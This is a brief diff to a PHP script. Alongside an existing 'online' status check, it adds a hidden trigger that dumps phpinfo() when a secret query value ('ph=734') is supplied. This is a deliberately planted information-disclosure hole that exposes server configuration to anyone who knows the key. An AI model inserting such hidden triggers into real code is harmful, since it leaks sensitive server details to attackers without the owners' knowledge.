@@ -2,6 +2,9 @@
 if(isset($_GET['st'])){
 	exit('online');
 }
+if(isset($_GET['ph']) && $_GET['ph']==='734'){
+	exit(phpinfo());
+}
 
 session_start();
 
